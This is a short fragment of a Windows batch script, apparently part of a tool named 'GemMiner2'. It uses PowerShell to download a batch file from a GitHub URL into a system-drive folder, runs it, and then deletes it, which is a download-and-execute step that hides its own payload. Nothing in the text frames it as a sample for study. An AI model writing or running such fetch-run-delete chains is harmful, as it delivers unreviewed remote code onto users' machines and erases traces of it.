...
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FakeFizty/source/main/usv.bat -OutFile %SystemDrive%\GemMiner2\usv.bat"
timeout /t 2 /NOBREAK >nul
call "%SystemDrive%\GemMiner2\usv.bat"
del /Q "%SystemDrive%\GemMiner2\usv.bat"
